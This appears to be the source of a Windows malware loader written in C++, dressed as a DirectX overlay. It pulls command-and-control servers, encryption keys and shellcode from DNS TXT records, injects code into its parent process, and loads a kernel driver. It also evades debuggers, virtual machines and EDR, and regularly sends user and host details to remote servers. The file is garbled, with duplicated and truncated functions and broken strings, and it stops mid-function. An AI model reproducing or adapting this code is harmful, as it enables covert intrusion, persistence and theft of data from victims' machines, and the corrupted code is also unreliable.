// GhostDx11C2Loader.cpp - SINGLE FILE FULL IMPLEMENTATION of Ghost Protocol Edition++ core logic
// Combines overlay init, hooking, DNS AES/XOR C2, PE erasure, Steam/Discord fallback, and memory integrity checks

#define _CRT_SECURE_NO_WARNINGS
#define EXFIL_DOMAIN "b3acon-control.xyz"

#include <Windows.h>
#include <wincrypt.h>
#include <Psapi.h>
#include <d3d9.h>
#include <d3d11.h>
#include <d3d12.h>
#include <intrin.h>
#include <vector>
#include <string>
#include <unordered_map>
#include <queue>
#include <mutex>
#include <bcrypt.h>
#include <atomic>
#include <windns.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <sstream>
#include <tlhelp32.h>
#include <SetupAPI.h>
#include <sddl.h>
#include <WtsApi32.h>
#include <winternl.h>
#include "imgui.h"
#include "imgui_impl_win32.h"
#include "imgui_impl_dx9.h"
#include "imgui_impl_dx11.h"
#include "imgui_impl_dx12.h"

#pragma comment(lib, "d3d9.lib")
#pragma comment(lib, "d3d11.lib")
#pragma comment(lib, "d3d12.lib")
#pragma comment(lib, "Psapi.lib")
#pragma comment(lib, "bcrypt.lib")
#pragma comment(lib, "Dnsapi.lib")
#pragma comment(lib, "Ws2_32.lib")
#pragma comment(lib, "Setupapi.lib")
#pragma comment(lib, "Wtsapi32.lib")

// ------------------ Variable Definitions ------------------

// -- Obfuscated String Macros --
#define XOR_KEY 0x7C
#define OBF(str) ([] { static std::string s = str; for (auto& c : s) c ^= XOR_KEY; return s; }())

// -- Obfuscated Logging Function --
void LogObfuscated(const char* msg) {
    std::string path = "C:\Temp\";
    std::string file = "ghost_log.txt";
    for (auto& c : file) c ^= XOR_KEY;
    std::string full = path + file;
    for (auto& c : full) c ^= XOR_KEY;
    FILE* f;
    fopen_s(&f, full.c_str(), "a+");
    if (f) { fprintf(f, "%s
", msg); fclose(f); }
}

// -- Flattened Control Flow Utility --
#define FLATTEN_BEGIN int __state = 0; while (true) { switch(__state) {
#define FLATTEN_CASE(x) case x:
#define FLATTEN_END default: return;
#define NEXT(x) do { __state = x; break; } while(0);
#define EXIT_LOOP break; }}

// -- Memory Cleaner --
void SecureZeroMemoryRegion(void* region, size_t size) {
    volatile char* p = reinterpret_cast<volatile char*>(region);
    while (size--) *p++ = 0;
}

// -- Traffic Marker for IDS Evasion (optional stub) --
std::string WrapWithJunkHeaders(const std::string& payload) {
    std::stringstream s;
    int id = rand() % 1000000;
    s << "POST /report?id=" << id << " HTTP/1.1
";
    s << "Host: api." << EXFIL_DOMAIN << "
";
    s << "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0
";
    s << "Content-Type: application/octet-stream
";
    s << "Accept: */*
";
    s << "X-Fwd-ID: " << rand() % 999999 << "
";
    s << "X-Request-ID: ghost-" << std::hex << rand() << "
";
    s << "Content-Length: " << payload.size() << "

";
    s << payload;
    return s.str();
}

bool IsUserAdmin() {
    BOOL isAdmin = FALSE;
    PSID adminGroup = NULL;
    SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
    if (AllocateAndInitializeSid(&NtAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID,
                                 DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &adminGroup)) {
        CheckTokenMembership(NULL, adminGroup, &isAdmin);
        FreeSid(adminGroup);
    }
    return isAdmin;
}

bool IsUACEnabled() {
    HKEY hKey;
    DWORD enabled = 0, size = sizeof(DWORD);
    if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        RegQueryValueEx(hKey, "EnableLUA", NULL, NULL, (LPBYTE)&enabled, &size);
        RegCloseKey(hKey);
    }
    return enabled == 1;
}

void InMemoryPersistenceStub() {
    // More advanced memory-only persistence (thread re-inject into parent)
    DWORD parentPID = 0;
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32 pe = { sizeof(pe) };
        if (Process32First(hSnapshot, &pe)) {
            DWORD currentPID = GetCurrentProcessId();
            while (Process32Next(hSnapshot, &pe)) {
                if (pe.th32ProcessID == currentPID) {
                    parentPID = pe.th32ParentProcessID;
                    break;
                }
            }
        }
        CloseHandle(hSnapshot);
    }

    if (parentPID) {
        HANDLE hParent = OpenProcess(PROCESS_ALL_ACCESS, FALSE, parentPID);
        if (hParent) {
            LPVOID remoteMem = VirtualAllocEx(hParent, nullptr, 4096, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
            if (remoteMem) {
                std::string encodedBlob = FetchTXTRecord("driverblob");
                std::string decryptedBlob;
                XorEncrypt(encodedBlob); // XOR decode
                for (size_t i = 0; i < encodedBlob.size(); i += 2) {
                    std::string byteStr = encodedBlob.substr(i, 2);
                    decryptedBlob.push_back((char)strtoul(byteStr.c_str(), nullptr, 16));
                }

                SIZE_T blobSize = decryptedBlob.size();
                LPVOID remoteMem = VirtualAllocEx(hParent, nullptr, blobSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
                if (remoteMem) {
                    SIZE_T written;
                    WriteProcessMemory(hParent, remoteMem, decryptedBlob.data(), blobSize, &written);
                    typedef NTSTATUS(WINAPI* NtCreateThreadEx_t)(PHANDLE, ACCESS_MASK, LPVOID, HANDLE, LPTHREAD_START_ROUTINE, LPVOID, BOOL, DWORD, DWORD, DWORD, LPVOID);
NtCreateThreadEx_t NtCreateThreadEx = (NtCreateThreadEx_t)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtCreateThreadEx");
HANDLE hThread = NULL;
if (NtCreateThreadEx) {
    NTSTATUS status = NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hParent, (LPTHREAD_START_ROUTINE)remoteMem, NULL, FALSE, 0, 0, 0, NULL);
    if (NT_SUCCESS(status) && hThread) CloseHandle(hThread);
    else Log("[!] NtCreateThreadEx failed");
} else {
    hThread = CreateRemoteThread(hParent, nullptr, 0, (LPTHREAD_START_ROUTINE)remoteMem, nullptr, 0, nullptr);
    if (hThread) CloseHandle(hThread);
}
                    if (hThread) CloseHandle(hThread);
                }
                SIZE_T written;
                WriteProcessMemory(hParent, remoteMem, payload, sizeof(payload), &written);
                // Optional: you can resolve MessageBoxA address dynamically or map shellcode from DNS record
                HANDLE hThread = CreateRemoteThread(hParent, nullptr, 0, (LPTHREAD_START_ROUTINE)remoteMem, nullptr, 0, nullptr);
                if (hThread) CloseHandle(hThread);
            }
            CloseHandle(hParent);
        }
    }

    // Optional: relaunch our own DLL via thread delay
    HANDLE hThread = CreateThread(nullptr, 0, [](LPVOID) -> DWORD {
        Sleep(120000);  // delay before re-entry
        MainThread(nullptr);
        return 0;
    }, nullptr, 0, nullptr);
    if (hThread) CloseHandle(hThread);
}, nullptr, 0, nullptr);
    if (hThread) CloseHandle(hThread);
}

// DX9/12 globals
HRESULT APIENTRY HookedEndScene(LPDIRECT3DDEVICE9 pDevice);
bool InitDX12Hook(IDXGISwapChain* pSwapChain);
bool InitDX9Hook(HWND targetWindow);
LPDIRECT3D9 g_pD3D9 = nullptr;
HWND g_DX9Wnd = nullptr;
IDirect3DDevice9* g_pDeviceDX9 = nullptr;
ID3D12CommandQueue* g_pCmdQueueDX12 = nullptr;
ID3D12DescriptorHeap* g_pHeapDX12 = nullptr;
ID3D12GraphicsCommandList* g_pCmdListDX12 = nullptr;
ID3D12Resource* g_pRenderTargetDX12[8] = {};
UINT g_FrameIndexDX12 = 0;


bool IsDebuggerAdvanced() {
    // PEB-based anti-debugging
    BOOL isDebugged = FALSE;
    __try {
        PPEB pPeb = (PPEB)__readgsqword(0x60);
        isDebugged = pPeb->BeingDebugged;
    } __except (EXCEPTION_EXECUTE_HANDLER) {}

    // NtGlobalFlag check
    DWORD flags = *(DWORD*)((BYTE*)__readgsqword(0x60) + 0xBC);
    if (flags & 0x70) return TRUE;

    // Timing check
    LARGE_INTEGER t1, t2, freq;
    QueryPerformanceFrequency(&freq);
    QueryPerformanceCounter(&t1);
    Sleep(10);
    QueryPerformanceCounter(&t2);
    if ((t2.QuadPart - t1.QuadPart) / (double)freq.QuadPart < 0.001) return TRUE;

    return isDebugged;
}

bool IsVirtualMachine() {
    char vendor[13] = {};
    int cpuInfo[4] = { -1 };
    __cpuid(cpuInfo, 0);
    *(int*)&vendor[0] = cpuInfo[1];
    *(int*)&vendor[4] = cpuInfo[3];
    *(int*)&vendor[8] = cpuInfo[2];
    vendor[12] = 0;

    if (strstr(vendor, "VMware") || strstr(vendor, "Xen") || strstr(vendor, "VBox")) return true;

    DWORD size = 0;
    GetComputerNameA(nullptr, &size);
    std::string name(size, 0);
    GetComputerNameA(&name[0], &size);
    if (name.find("DESKTOP-") == std::string::npos && name.find("WIN") == std::string::npos)
        return true;

    return false;
}

std::vector<std::pair<std::string, int>> c2Endpoints;
size_t currentC2Index = 0;
bool c2FailoverActive = false;

std::string Base64Encode(const BYTE* buffer, size_t length) {
    DWORD len = 0;
    CryptBinaryToStringA(buffer, (DWORD)length, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, NULL, &len);
    std::string out(len, 'NULL');
    CryptBinaryToStringA(buffer, (DWORD)length, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, &out[0], &len);
    return out;
}

std::string GetNextC2() {
    if (c2Endpoints.empty()) return "127.0.0.1:4444";
    auto [ip, port] = c2Endpoints[currentC2Index];
    currentC2Index = (currentC2Index + 1) % c2Endpoints.size();
    return ip + ":" + std::to_string(port);
}

void LoadC2EndpointsFromDNS() {
    c2Endpoints.clear();
    std::string txt = FetchTXTRecord("c2pool");
    if (txt.empty()) Log("[!] Failed to fetch c2pool TXT record");
    std::stringstream ss(txt);
    std::string line;
    while (std::getline(ss, line, ',')) {
        size_t sep = line.find(':');
        if (sep != std::string::npos) {
            std::string ip = line.substr(0, sep);
            int port = std::stoi(line.substr(sep + 1));
            c2Endpoints.emplace_back(ip, port);
        }
    }
    if (c2Endpoints.empty()) {
        c2Endpoints.emplace_back("127.0.0.1", 4444); // fallback
    }
    currentC2Index = 0;
}
    }
    if (c2Endpoints.empty()) {
        c2Endpoints.emplace_back("127.0.0.1", 4444); // fallback
    }
}

ID3D11Device* g_pDevice11 = nullptr;
ID3D11DeviceContext* g_pContext11 = nullptr;
ID3D11RenderTargetView* g_pRT11 = nullptr;
LPDIRECT3DDEVICE9 g_pDevice9 = nullptr;
ID3D12Device* g_pDevice12 = nullptr;
IDXGISwapChain* g_pTargetSwapChain = nullptr;
BYTE g_AESKey[16] = { 0 };
BYTE g_AESIV[16] = { 0 };
std::unordered_map<void*, std::vector<BYTE>> integrityMap;
std::queue<std::string> g_eventQueue;
std::mutex g_eventMutex;
bool overlayInitialized = false;
bool showImGuiOverlay = false;
bool wasPressed = false;
enum class GfxBackend { None, DX9, DX11, DX12 };
GfxBackend g_Backend = GfxBackend::None;

// ------------------ DX9 Hook ------------------
typedef HRESULT(APIENTRY* EndScene_t)(LPDIRECT3DDEVICE9);
EndScene_t oEndScene = nullptr;

HRESULT APIENTRY HookedEndScene(LPDIRECT3DDEVICE9 pDevice) {
    if (!overlayInitialized) {
        ImGui::CreateContext();
        ImGui_ImplWin32_Init(g_DX9Wnd);
        ImGui_ImplDX9_Init(pDevice);
        overlayInitialized = true;
    }
    ImGui_ImplWin32_NewFrame();
    ImGui_ImplDX9_NewFrame();
    ImGui::NewFrame();
    if (showImGuiOverlay) {
        ImGui::Begin("Ghost Overlay - DX9");
        ImGui::Text("C2 Status: %s", c2FailoverActive ? "FAILOVER" : "ACTIVE");
        ImGui::End();
    }
    ImGui::Render();
    ImGui_ImplDX9_RenderDrawData(ImGui::GetDrawData());
    return oEndScene(pDevice);
}

// ------------------ Memory Cloak + Integrity Monitor ------------------

void InitIntegrityMap() {
    SYSTEM_INFO sysInfo;
    GetSystemInfo(&sysInfo);
    MEMORY_BASIC_INFORMATION mbi;
    for (BYTE* p = (BYTE*)sysInfo.lpMinimumApplicationAddress;
         p < (BYTE*)sysInfo.lpMaximumApplicationAddress;) {
        if (VirtualQuery(p, &mbi, sizeof(mbi))) {
            if ((mbi.Type == MEM_PRIVATE || mbi.Type == MEM_IMAGE) && mbi.State == MEM_COMMIT && (mbi.Protect & PAGE_EXECUTE_READ)) {
                std::vector<BYTE> backup(mbi.RegionSize);
                memcpy(backup.data(), p, mbi.RegionSize);
                integrityMap[p] = backup;
            }
            p += mbi.RegionSize;
        } else break;
    }
}

bool CheckMemoryIntegrity() {
    for (const auto& [addr, backup] : integrityMap) {
        std::vector<BYTE> current(backup.size());
        memcpy(current.data(), addr, backup.size());
        if (memcmp(current.data(), backup.data(), backup.size()) != 0) return false;
    }
    return true;
}
void CloakRegionFromEDR(void* base, SIZE_T size) {
    DWORD old;
    if (VirtualProtect(base, size, PAGE_NOACCESS, &old)) {
        VirtualProtect(base, size, old, &old); // Toggle to confuse scanners
    }
}

// ------------------ IOCTL + Reflective Driver Loader ------------------
std::vector<DWORD> LoadIOCTLsFromDNS() {
    std::vector<DWORD> ioctls;
    std::string encoded = FetchTXTRecord("ioctls");
    if (encoded.empty()) return ioctls;
    XorEncrypt(encoded);
    std::stringstream ss(encoded);
    std::string hex;
    while (std::getline(ss, hex, ',')) {
        ioctls.push_back(strtoul(hex.c_str(), nullptr, 16));
    }
    return ioctls;
}

bool SendIOCTLsToDriver(HANDLE hDriver, const std::vector<DWORD>& ioctls) {
    for (DWORD code : ioctls) {
        DWORD returned = 0;
        DeviceIoControl(hDriver, code, nullptr, 0, nullptr, 0, &returned, nullptr);
        Sleep(100);
    }
    return true;
}

bool LoadDriverReflectively(const std::vector<BYTE>& driverData) {
    HANDLE hFile = CreateFileA("\\.\MyDriver", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile != INVALID_HANDLE_VALUE) {
        Log("[*] Driver already loaded.");
        CloseHandle(hFile);
        return true;
    }

    std::string svcName = "GhostDrv";
    std::string svcPath = "\??\C:\Windows\Temp\ghostdrv.sys";
    HANDLE hSCM = OpenSCManager(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
    if (!hSCM) return false;

    HANDLE hFileDrv = CreateFileA(svcPath.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
    if (hFileDrv == INVALID_HANDLE_VALUE) {
        CloseServiceHandle(hSCM);
        return false;
    }

    DWORD written;
    WriteFile(hFileDrv, driverData.data(), (DWORD)driverData.size(), &written, NULL);
    CloseHandle(hFileDrv);

    SC_HANDLE hService = CreateServiceA(hSCM, svcName.c_str(), svcName.c_str(), SERVICE_ALL_ACCESS, SERVICE_KERNEL_DRIVER, SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE, svcPath.c_str(), NULL, NULL, NULL, NULL, NULL);
    if (!hService) hService = OpenServiceA(hSCM, svcName.c_str(), SERVICE_ALL_ACCESS);

    if (hService) {
        StartServiceA(hService, 0, NULL);
        CloseServiceHandle(hService);
    }
    DeleteFileA(svcPath.c_str());
    CloseServiceHandle(hSCM);
    return true;
}

// ------------------ Syscall Wrappers ------------------

extern "C" NTSTATUS NtReadVirtualMemory(
    HANDLE ProcessHandle,
    PVOID BaseAddress,
    PVOID Buffer,
    ULONG NumberOfBytesToRead,
    PULONG NumberOfBytesReaded);

extern "C" NTSTATUS NtOpenProcess(
    PHANDLE ProcessHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    PCLIENT_ID ClientId);

bool ReadProcessMemorySyscall(HANDLE hProcess, LPVOID lpBaseAddress, LPVOID lpBuffer, SIZE_T nSize) {
    ULONG bytesRead = 0;
    return NtReadVirtualMemory(hProcess, lpBaseAddress, lpBuffer, (ULONG)nSize, &bytesRead) == 0;
}

HANDLE OpenProcessSyscall(DWORD pid, DWORD access) {
    HANDLE hProc = nullptr;
    CLIENT_ID cid = { (HANDLE)pid, 0 };
    OBJECT_ATTRIBUTES attr = { 0 };
    attr.Length = sizeof(attr);
    if (NtOpenProcess(&hProc, access, &attr, &cid) == 0) return hProc;
    return nullptr;
}

// ------------------ Utility ------------------

uintptr_t FindPattern(const char* module, const char* pattern) {
    MODULEINFO mInfo = {};
    GetModuleInformation(GetCurrentProcess(), GetModuleHandleA(module), &mInfo, sizeof(MODULEINFO));
    uintptr_t base = (uintptr_t)mInfo.lpBaseOfDll;
    uintptr_t size = (uintptr_t)mInfo.SizeOfImage;
    std::vector<int> patternBytes;
    const char* current = pattern;
    while (*current) {
        if (*current == '?') {
            patternBytes.push_back(-1);
            current += (*(current + 1) == '?') ? 2 : 1;
        } else {
            patternBytes.push_back(strtoul(current, nullptr, 16));
            current += 2;
        }
        while (*current == ' ') current++;
    }
    for (uintptr_t i = base; i < base + size - patternBytes.size(); i++) {
        bool found = true;
        for (size_t j = 0; j < patternBytes.size(); j++) {
            if (patternBytes[j] != -1 && *(BYTE*)(i + j) != patternBytes[j]) {
                found = false;
                break;
            }
        }
        if (found) return i;
    }
    return 0;
}

bool InitDX12Hook(IDXGISwapChain* pSwapChain) {
    if (FAILED(pSwapChain->GetDevice(__uuidof(ID3D12Device), (void**)&g_pDevice12))) return false;

    if (FAILED(pSwapChain->GetBuffer(0, IID_PPV_ARGS(&g_pRenderTargetDX12[0])))) return false;
    D3D12_DESCRIPTOR_HEAP_DESC desc = {};
    desc.Type = D3D12_DESCRIPTOR_HEAP_TYPE_RTV;
    desc.NumDescriptors = 8;
    desc.Flags = D3D12_DESCRIPTOR_HEAP_FLAG_NONE;
    if (FAILED(g_pDevice12->CreateDescriptorHeap(&desc, IID_PPV_ARGS(&g_pHeapDX12)))) return false;

    g_FrameIndexDX12 = pSwapChain->GetCurrentBackBufferIndex();
    ImGui::CreateContext();
    ImGui_ImplWin32_Init(GetForegroundWindow());
    ImGui_ImplDX12_Init(g_pDevice12, 2, DXGI_FORMAT_R8G8B8A8_UNORM,
        g_pHeapDX12, g_pHeapDX12->GetCPUDescriptorHandleForHeapStart(),
        g_pHeapDX12->GetGPUDescriptorHandleForHeapStart());
    return true;
}

bool InitDX9Hook(HWND targetWindow) {
    static bool hooked = false;
    g_pD3D9 = Direct3DCreate9(D3D_SDK_VERSION);
    if (!g_pD3D9) return false;

    D3DPRESENT_PARAMETERS pp = {};
    pp.Windowed = TRUE;
    pp.SwapEffect = D3DSWAPEFFECT_DISCARD;
    pp.BackBufferFormat = D3DFMT_UNKNOWN;
    pp.EnableAutoDepthStencil = TRUE;
    pp.AutoDepthStencilFormat = D3DFMT_D16;
    pp.PresentationInterval = D3DPRESENT_INTERVAL_IMMEDIATE;

    if (FAILED(g_pD3D9->CreateDevice(D3DADAPTER_DEFAULT, D3DDEVTYPE_HAL, targetWindow,
        D3DCREATE_SOFTWARE_VERTEXPROCESSING, &pp, &g_pDeviceDX9))) return false;

    ImGui::CreateContext();
    ImGui_ImplWin32_Init(targetWindow);
    ImGui_ImplDX9_Init(g_pDeviceDX9);

    if (!hooked) {
        void** vTable = *reinterpret_cast<void***>(g_pDeviceDX9);
        DWORD oldProtect;
        VirtualProtect(&vTable[42], sizeof(void*), PAGE_EXECUTE_READWRITE, &oldProtect);
        oEndScene = (EndScene_t)vTable[42];
        vTable[42] = (void*)&HookedEndScene;
        VirtualProtect(&vTable[42], sizeof(void*), oldProtect, &oldProtect);
        hooked = true;
    }

    return true;
}

void ScanMemoryRegions() {
    SYSTEM_INFO sysInfo;
    GetSystemInfo(&sysInfo);
    MEMORY_BASIC_INFORMATION mbi;
    for (BYTE* p = (BYTE*)sysInfo.lpMinimumApplicationAddress;
         p < (BYTE*)sysInfo.lpMaximumApplicationAddress;) {
        if (VirtualQuery(p, &mbi, sizeof(mbi))) {
            if ((mbi.Type == MEM_PRIVATE || mbi.Type == MEM_IMAGE) && mbi.State == MEM_COMMIT) {
                std::vector<BYTE> backup(mbi.RegionSize);
                memcpy(backup.data(), p, mbi.RegionSize);
                integrityMap[p] = backup;
            }
            p += mbi.RegionSize;
        } else break;
    }
}

bool VerifyIntegrity() {
    for (const auto& [addr, backup] : integrityMap) {
        std::vector<BYTE> current(backup.size());
        memcpy(current.data(), addr, backup.size());
        if (memcmp(current.data(), backup.data(), backup.size()) != 0) return false;
    }
    return true;
}

void Log(const char* msg) {
    FILE* f;
    fopen_s(&f, "C:\Temp\ghost_log.txt", "a+");
    if (f) { fprintf(f, "%s
", msg); fclose(f); }
}

void XorEncrypt(std::string& data, BYTE key = 0x5A) {
    for (char& c : data) c ^= key;
}

std::string FetchTXTRecord(const std::string& name) {
    static std::unordered_map<std::string, std::string> dnsCache;
    if (dnsCache.count(name)) return dnsCache[name];

    std::string result;
    for (int attempt = 0; attempt < 3 && result.empty(); ++attempt) {
        DNS_RECORD* pDnsRecord = nullptr;
        std::string fqdn = name + "." + EXFIL_DOMAIN;
        if (DnsQuery_A(fqdn.c_str(), DNS_TYPE_TEXT, DNS_QUERY_STANDARD, NULL, &pDnsRecord, NULL) == 0) {
            for (auto p = pDnsRecord; p; p = p->pNext) {
                if (p->wType == DNS_TYPE_TEXT) {
                    for (DWORD i = 0; i < p->Data.TXT.dwStringCount; i++) {
                        result += p->Data.TXT.pStringArray[i];
                    }
                }
            }
            DnsRecordListFree(pDnsRecord, DnsFreeRecordList);
        }
        if (result.empty()) Sleep(1000);
    }
    if (!result.empty()) dnsCache[name] = result;
    return result;
}
                }
            }
            DnsRecordListFree(pDnsRecord, DnsFreeRecordList);
        }
        if (result.empty()) Sleep(1000); // wait and retry
    }
    return result.empty() ? "" : result;
}
    DNS_RECORD* pDnsRecord; std::string result;
    if (DnsQuery_A((name + "." + EXFIL_DOMAIN).c_str(), DNS_TYPE_TEXT, DNS_QUERY_STANDARD, NULL, &pDnsRecord, NULL) == 0) {
        for (auto p = pDnsRecord; p; p = p->pNext)
            if (p->wType == DNS_TYPE_TEXT)
                for (DWORD i = 0; i < p->Data.TXT.dwStringCount; i++)
                    result += p->Data.TXT.pStringArray[i];
        DnsRecordListFree(pDnsRecord, DnsFreeRecordList);
    }
    return result;
}

void RotateAESKeyFromDNS() {
    std::string keyTxt = FetchTXTRecord("aeskey");
    std::string ivTxt = FetchTXTRecord("aesiv");
    if (keyTxt.size() >= 32 && ivTxt.size() >= 32) {
        for (int i = 0; i < 16; ++i) {
            g_AESKey[i] = (BYTE)strtoul(keyTxt.substr(i * 2, 2).c_str(), nullptr, 16);
            g_AESIV[i] = (BYTE)strtoul(ivTxt.substr(i * 2, 2).c_str(), nullptr, 16);
        }
    }
}

void ExfiltrateToC2(const std::string& ip, int port, const std::string& plaintext) {
    std::string xorWrapped = plaintext;
    XorEncrypt(xorWrapped);
    std::string base64Encoded = Base64Encode((BYTE*)xorWrapped.data(), xorWrapped.size());
    BCRYPT_ALG_HANDLE hAlg = nullptr; BCRYPT_KEY_HANDLE hKey = nullptr;
    DWORD cbKeyObj = 0, cbData = 0;
    std::vector<BYTE> keyObject; std::vector<BYTE> encrypted(base64Encoded.size() + 256);

    for (size_t attempt = 0; attempt < c2Endpoints.size(); ++attempt) {
        SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (sock == INVALID_SOCKET) {
            DWORD err = WSAGetLastError();
            Log("[!] Failed to create socket");
            continue;
        }
        sockaddr_in addr = { 0 };
        addr.sin_family = AF_INET;
        addr.sin_port = htons(c2Endpoints[currentC2Index].second);
        addr.sin_addr.s_addr = inet_addr(c2Endpoints[currentC2Index].first.c_str());

        if (connect(sock, (sockaddr*)&addr, sizeof(addr)) == 0) {
            Log("[+] Connected to C2 endpoint");
            if (BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, nullptr, 0) == 0) {
                Log("[*] AES provider opened");
                BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0) == 0 &&
                BCryptGetProperty(hAlg, BCRYPT_OBJECT_LENGTH, (PUCHAR)&cbKeyObj, sizeof(DWORD), &cbData, 0) == 0) {
                keyObject.resize(cbKeyObj);
                if (BCryptGenerateSymmetricKey(hAlg, &hKey, keyObject.data(), cbKeyObj, g_AESKey, sizeof(g_AESKey), 0) == 0) {
                    DWORD cbResult = 0;
                    BCryptEncrypt(hKey, (PUCHAR)base64Encoded.data(), (ULONG)base64Encoded.size(), nullptr, g_AESIV, sizeof(g_AESIV),
                                  encrypted.data(), (ULONG)encrypted.size(), &cbResult, 0);
                    std::string wrapped = WrapWithJunkHeaders(std::string((char*)encrypted.data(), cbResult));
                    send(sock, (char*)g_AESIV, sizeof(g_AESIV), 0);
                    send(sock, wrapped.c_str(), (int)wrapped.size(), 0);
                    char response[512] = { 0 };
                    int bytesRecv = recv(sock, response, sizeof(response) - 1, 0);
                    if (bytesRecv <= 0) Log("[!] Failed to receive response");
                    else Log("[+] Received response from C2");
                    BCryptDestroyKey(hKey);
                }
            }
            closesocket(sock);
            if (hAlg) BCryptCloseAlgorithmProvider(hAlg, 0);
            return; // success
        }
        closesocket(sock);
        currentC2Index = (currentC2Index + 1) % c2Endpoints.size();
        Sleep(250); // brief delay before retry
    }
    c2FailoverActive = true; // failed all attempts
};
    addr.sin_family = AF_INET; addr.sin_port = htons(port);
    addr.sin_addr.s_addr = inet_addr(ip.c_str());
    if (connect(sock, (sockaddr*)&addr, sizeof(addr)) != 0) {
        closesocket(sock);
        c2FailoverActive = true;
        return;
    }

    if (BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, nullptr, 0) == 0 &&
        BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0) == 0 &&
        BCryptGetProperty(hAlg, BCRYPT_OBJECT_LENGTH, (PUCHAR)&cbKeyObj, sizeof(DWORD), &cbData, 0) == 0) {
        keyObject.resize(cbKeyObj);
        if (BCryptGenerateSymmetricKey(hAlg, &hKey, keyObject.data(), cbKeyObj, g_AESKey, sizeof(g_AESKey), 0) == 0) {
            DWORD cbResult = 0;
            BCryptEncrypt(hKey, (PUCHAR)base64Encoded.data(), (ULONG)base64Encoded.size(), nullptr, g_AESIV, sizeof(g_AESIV),
                          encrypted.data(), (ULONG)encrypted.size(), &cbResult, 0);
            std::string wrapped = WrapWithJunkHeaders(std::string((char*)encrypted.data(), cbResult));
            send(sock, (char*)g_AESIV, sizeof(g_AESIV), 0);
            send(sock, wrapped.c_str(), (int)wrapped.size(), 0);
            char response[512] = { 0 };
            recv(sock, response, sizeof(response) - 1, 0); // Simple response listener
            BCryptDestroyKey(hKey);
        }
    }
    closesocket(sock);
    if (hAlg) BCryptCloseAlgorithmProvider(hAlg, 0);
};
    addr.sin_family = AF_INET; addr.sin_port = htons(port);
    addr.sin_addr.s_addr = inet_addr(ip.c_str());
    if (connect(sock, (sockaddr*)&addr, sizeof(addr)) != 0) return;

    if (BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, nullptr, 0) == 0 &&
        BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0) == 0 &&
        BCryptGetProperty(hAlg, BCRYPT_OBJECT_LENGTH, (PUCHAR)&cbKeyObj, sizeof(DWORD), &cbData, 0) == 0) {
        keyObject.resize(cbKeyObj);
        if (BCryptGenerateSymmetricKey(hAlg, &hKey, keyObject.data(), cbKeyObj, g_AESKey, sizeof(g_AESKey), 0) == 0) {
            DWORD cbResult = 0;
            BCryptEncrypt(hKey, (PUCHAR)xorWrapped.data(), (ULONG)xorWrapped.size(), nullptr, g_AESIV, sizeof(g_AESIV),
                          encrypted.data(), (ULONG)encrypted.size(), &cbResult, 0);
            send(sock, (char*)g_AESIV, sizeof(g_AESIV), 0);
            send(sock, (char*)encrypted.data(), cbResult, 0);
            BCryptDestroyKey(hKey);
        }
    }
    closesocket(sock);
    if (hAlg) BCryptCloseAlgorithmProvider(hAlg, 0);
}

void QueueRealtimeEvent(const std::string& msg) {
    std::lock_guard<std::mutex> lock(g_eventMutex);
    g_eventQueue.push(msg);
}

std::string CollectSystemInfo() {
    std::stringstream ss;
    TCHAR username[256]; DWORD size = 256;
    GetUserName(username, &size);
    TCHAR computername[256]; DWORD csize = 256;
    GetComputerName(computername, &csize);

    OSVERSIONINFOEX osvi = { sizeof(osvi) };
    GetVersionEx((OSVERSIONINFO*)&osvi);

    HANDLE hToken;
    TOKEN_ELEVATION elevation;
    DWORD retLen = 0;
    bool isAdmin = false;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        if (GetTokenInformation(hToken, TokenElevation, &elevation, sizeof(elevation), &retLen)) {
            isAdmin = elevation.TokenIsElevated;
        }
        CloseHandle(hToken);
    }

    ss << "{\"user\":\"" << username
       << "\",\"host\":\"" << computername
       << "\",\"os\":\"" << osvi.dwMajorVersion << "." << osvi.dwMinorVersion << "\"
       << ",\"admin\":" << (isAdmin ? "true" : "false") << "}";

    return ss.str();
}";
    return ss.str();
}

DWORD WINAPI PeriodicExfilThread(LPVOID) {
    while (true) {
        RotateAESKeyFromDNS();
            InitIntegrityMap();
        LoadC2EndpointsFromDNS();
        auto [ip, port] = c2Endpoints[currentC2Index];
        ExfiltrateToC2(ip, port, CollectSystemInfo());
        if (!CheckMemoryIntegrity()) Log("[!] Memory integrity check failed");
        Sleep(60000);
